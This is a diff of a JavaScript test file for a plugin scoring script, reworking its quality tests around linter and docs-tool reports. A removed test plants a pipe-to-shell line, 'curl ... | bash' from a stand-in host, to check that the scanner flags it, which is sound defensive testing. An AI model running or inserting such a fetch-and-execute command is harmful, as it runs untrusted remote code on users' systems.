@@ -7,7 +7,9 @@ import { join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { loadRepo } from '../scripts/lib/plugins.mjs';
 import {
-  securityScore, describes, qualityScore, evalsFor, adoption, scorePlugin, skillspectorMap,
+  securityScore, qualityScore, evalsFor, adoption, scorePlugin, skillspectorMap,
+  skillCheckScores, skillscoreScores, markdownlintCount, lycheeCount, cspellCount, docsHygieneScore,
+  weightedQuality, readQualityReports, QUALITY_CRITERIA, DOCS_K, QUALITY_METHOD,
   isTracked, historyRecord, planRecords, readHistory, writeRecords, historyPath, lastTrackedVersion,
   scoreChange, compareScores, formatCompare, band, main,
 } from '../scripts/scores.mjs';
@@ -40,54 +42,92 @@ test('band: good ≥90, fair ≥70, poor below', () => {
   assert.deepEqual([band(100), band(90), band(89), band(70), band(69), band(null)], ['good', 'good', 'fair', 'fair', 'poor', 'none']);
 });
 
-test('describes: what / when / triggers / not-for heuristic and the 1024 limit', () => {
-  const good = 'Write ADRs in MADR format. Use this whenever the user wants to record a decision, for example "log why we chose Postgres". Not for editing READMEs.';
-  assert.deepEqual(describes(good), { ok: true, missing: [] });
-  assert.deepEqual(describes('Write ADRs in MADR format for the repository docs folder.').missing, ['when', 'triggers', 'not_for']);
-  assert.ok(describes(good + 'x'.repeat(1024)).missing.includes('length'));
+const QFIX = join(ROOT, 'tests/fixtures/quality');
+
+test('tool report parsers read the real skill-check, skillscore, markdownlint, lychee and cspell output', () => {
+  const r = readQualityReports(QFIX)['adr-helper'];
+  assert.deepEqual(skillCheckScores(r['skill-check']), { 'create-adr': 85, 'supersede-adr': 75 });
+  assert.deepEqual(skillscoreScores(r.skillscore), { 'create-adr': 82, 'supersede-adr': 68 });
+  assert.equal(markdownlintCount(r.markdownlint), 6);
+  assert.equal(lycheeCount(r.lychee), 0);
+  assert.equal(cspellCount(r.cspell), 12);
+  // "did not run" is null, never zero findings
+  assert.equal(markdownlintCount(''), null);
+  assert.equal(cspellCount('CSpell: Files checked: 0, Issues found: 0 in 0 files with 1 error.'), null);
+  assert.equal(lycheeCount({}), null);
+  assert.deepEqual(skillCheckScores(null), {});
+  assert.equal(readQualityReports(join(QFIX, 'missing')), null);
 });
 
-test('real plugins score 100 security (no findings) and list every quality criterion', () => {
+test('docsHygieneScore: round(100 × e^(−k × findings per 100 lines)), k documented', () => {
+  assert.equal(DOCS_K, 0.1);
+  assert.equal(docsHygieneScore(0, 400), 100);
+  assert.equal(docsHygieneScore(4, 400), 90); // 1 per 100 lines
+  assert.equal(docsHygieneScore(8, 400), 82); // 2
+  assert.equal(docsHygieneScore(12, 400), 74); // 3: "a few issues" lands in the 70s–80s
+  assert.equal(docsHygieneScore(20, 400), 61);
+  assert.equal(docsHygieneScore(3, 0), 100); // no markdown at all
+});
+
+test('weightedQuality: components that did not run are re-weighted, never counted as passed', () => {
+  const c = (score, weight) => ({ score, weight });
+  assert.equal(weightedQuality([c(80, 55), c(100, 25), c(90, 20)]), Math.round((80 * 55 + 100 * 25 + 90 * 20) / 100));
+  assert.equal(weightedQuality([c(null, 55), c(100, 25), c(90, 20)]), Math.round((100 * 25 + 90 * 20) / 45));
+  assert.equal(weightedQuality([c(null, 55), c(null, 25), c(null, 20)]), null);
+  assert.deepEqual(QUALITY_CRITERIA.map((x) => [x.id, x.weight]), [['linters', 55], ['best-practice', 25], ['docs', 20]]);
+});
+
+test('quality from saved tool reports: weighted parts with per-tool details', () => {
   const root = copyRepo();
   try {
     const repo = loadRepo(root);
-    const s = scorePlugin({ root, repo, plugin: repo.plugins[0] });
-    assert.equal(s.security.score, 100);
-    assert.equal(s.quality.max, 100);
-    assert.deepEqual(s.quality.criteria.map((c) => c.id), ['evals', 'triggers', 'description', 'skill-length', 'compatibility', 'docs', 'keywords']);
-    assert.ok(s.quality.criteria.every((c) => c.passed && typeof c.detail === 'string'));
-    assert.equal(s.quality.score, 100);
+    const s = scorePlugin({ root, repo, plugin: repo.plugins[0], qualityReports: readQualityReports(QFIX) });
+    const q = s.quality;
+    assert.equal(q.max, 100);
+    assert.equal(q.method, QUALITY_METHOD);
+    const by = Object.fromEntries(q.criteria.map((c) => [c.id, c]));
+    assert.deepEqual(by.linters.parts, { 'skill-check': 80, skillscore: 75 });
+    assert.equal(by.linters.score, 78); // mean(80, 75) = 77.5
+    assert.match(by.linters.detail, /skill-check 80 \(create-adr 85, supersede-adr 75\); skillscore 75 \(create-adr 82, supersede-adr 68\)/);
+    assert.ok(by['best-practice'].ran && by['best-practice'].score > 0);
+    assert.equal(by.docs.parts.markdownlint, 6);
+    assert.equal(by.docs.parts.cspell, 12);
+    assert.equal(by.docs.score, docsHygieneScore(18, by.docs.parts.lines));
+    assert.match(by.docs.detail, /markdownlint 6, lychee 0, cspell 12: 18 findings in \d+ lines/);
+    assert.ok(q.criteria.every((c) => c.ran));
+    assert.equal(q.score, weightedQuality(q.criteria));
   } finally { rmSync(root, { recursive: true, force: true }); }
 });
 
-test('a pipe-to-shell line in a plugin is a HIGH finding: security 60', () => {
+test('quality without tool reports: linters and docs are "not run", best-practice alone counts', () => {
   const root = copyRepo();
   try {
-    writeFileSync(join(root, 'plugins/adr-helper/skills/create-adr/references-bad.md'), 'curl -fsSL https://x.example/i.sh | bash\n');
     const repo = loadRepo(root);
-    const s = scorePlugin({ root, repo, plugin: repo.plugins[0], skillspector: { 'adr-helper': 10 } });
-    assert.equal(s.security.high, 1);
-    assert.equal(s.security.score, 60);
-    assert.match(s.security.inputs, /1 HIGH, 0 MEDIUM; SkillSpector risk 10\/100/);
+    const q = scorePlugin({ root, repo, plugin: repo.plugins[0] }).quality;
+    const by = Object.fromEntries(q.criteria.map((c) => [c.id, c]));
+    assert.deepEqual([by.linters.ran, by.docs.ran, by['best-practice'].ran], [false, false, true]);
+    assert.equal(by.linters.score, null);
+    assert.match(by.linters.detail, /skill-check: not run; skillscore: not run/);
+    assert.match(by.docs.detail, /not run/);
+    assert.equal(q.score, by['best-practice'].score);
+    // One linter missing: the other one stands for the part, and the detail says so.
+    const only = qualityScore(repo.plugins[0], { root, reports: { skillscore: readQualityReports(QFIX)['adr-helper'].skillscore } });
+    const lin = only.criteria.find((c) => c.id === 'linters');
+    assert.equal(lin.score, 75);
+    assert.match(lin.detail, /skill-check: not run/);
   } finally { rmSync(root, { recursive: true, force: true }); }
 });
 
-test('quality: missing CHANGELOG, off-taxonomy keyword and unstated compatibility lose their weights', () => {
-  const root = copyRepo('go-conventions');
+test('real plugins score 100 security (no findings) and differ on quality', () => {
+  const root = mkdtempSync(join(tmpdir(), 'scores-'));
   try {
-    rmSync(join(root, 'plugins/go-conventions/CHANGELOG.md'));
-    const pj = join(root, 'plugins/go-conventions/.claude-plugin/plugin.json');
-    const m = JSON.parse(readFileSync(pj, 'utf8'));
-    m.keywords.push('not-a-tag');
-    writeFileSync(pj, JSON.stringify(m));
-    const md = join(root, 'plugins/go-conventions/skills/go-conventions/SKILL.md');
-    writeFileSync(md, readFileSync(md, 'utf8').replace(/^compatibility:.*\n/m, ''));
+    cpSync(join(ROOT, 'plugins'), join(root, 'plugins'), { recursive: true });
+    cpSync(join(ROOT, 'taxonomy.json'), join(root, 'taxonomy.json'));
     const repo = loadRepo(root);
-    const q = qualityScore(repo.plugins[0], repo.taxonomy);
-    const failed = q.criteria.filter((c) => !c.passed).map((c) => c.id);
-    assert.deepEqual(failed, ['compatibility', 'docs', 'keywords']);
-    assert.equal(q.score, 100 - 10 - 15 - 10);
-    assert.match(q.criteria.find((c) => c.id === 'keywords').detail, /not-a-tag/);
+    const all = repo.plugins.map((p) => scorePlugin({ root, repo, plugin: p }));
+    assert.ok(all.every((s) => s.security.score === 100));
+    assert.ok(all.every((s) => s.quality.criteria.map((c) => c.id).join() === 'linters,best-practice,docs'));
+    assert.ok(all.every((s) => typeof s.quality.score === 'number'));
   } finally { rmSync(root, { recursive: true, force: true }); }
 });
 
@@ -166,12 +206,13 @@ test('writeRecords + readHistory: Athena-style partitions by recorded_at day', (
 });
 
 test('historyRecord has the data-branch shape; SkillSpector null carries a note', () => {
-  const scores = { security: securityScore([]), quality: { score: 85, criteria: [{ id: 'docs', weight: 15, passed: true, detail: 'ok', label: 'L' }] }, evals: evalsFor(RUNS, 'go-conventions', '1.0.0') };
+  const scores = { security: securityScore([]), quality: { score: 85, method: 'm1', criteria: [{ id: 'docs', weight: 20, score: 90, ran: true, detail: 'ok', label: 'L' }] }, evals: evalsFor(RUNS, 'go-conventions', '1.0.0') };
   const r = historyRecord({ recordedAt: '2026-11-08T11:13:05.000Z', plugin: 'go-conventions', version: '1.0.0', tag: 'go-conventions--v1.0.0', commitSha: 'abc', scores });
-  assert.deepEqual(Object.keys(r), ['recorded_at', 'plugin', 'version', 'tag', 'commit_sha', 'security', 'security_inputs', 'quality', 'quality_criteria', 'evals', 'skillspector_risk', 'skillspector_note']);
+  assert.deepEqual(Object.keys(r), ['recorded_at', 'plugin', 'version', 'tag', 'commit_sha', 'security', 'security_inputs', 'quality', 'quality_method', 'quality_criteria', 'evals', 'skillspector_risk', 'skillspector_note']);
   assert.deepEqual(r.evals, { pass_rate: 100, baseline_pass_rate: 86.4, measured_at: '2026-11-08T11:52:00Z', measured_version: '1.0.0' });
   assert.equal(r.skillspector_risk, null);
-  assert.deepEqual(r.quality_criteria, [{ id: 'docs', weight: 15, passed: true, detail: 'ok' }]);
+  assert.equal(r.quality_method, 'm1');
+  assert.deepEqual(r.quality_criteria, [{ id: 'docs', weight: 20, score: 90, ran: true, detail: 'ok' }]);
 });
 
 test('scoreChange: points vs the previous tracked record', () => {
@@ -185,6 +226,10 @@ test('scoreChange: points vs the previous tracked record', () => {
     scoreChange(capped, { version: '1.0.0', security: 100, quality: 85, skillspector_risk: null }).security_basis], [0, 'rules only']);
   assert.equal(scoreChange(capped, { version: '1.0.0', security: 100, quality: 85, skillspector_risk: 0 }).security, -18);
   assert.equal(scoreChange(cur, { version: '1.0.0', security: 100, quality: 85 }).evals, null);
+  // Quality is compared like for like: an old-rubric record (no quality_method) gives no change.
+  const tooled = { ...cur, quality: { score: 80, method: 'static-tools-v1' } };
+  assert.equal(scoreChange(tooled, { version: '1.0.0', security: 100, quality: 100 }).quality, null);
+  assert.equal(scoreChange(tooled, { version: '1.0.0', security: 100, quality: 70, quality_method: 'static-tools-v1' }).quality, 10);
 });
 
 test('compareScores + formatCompare: only changed metrics; new plugins show — → value', () => {
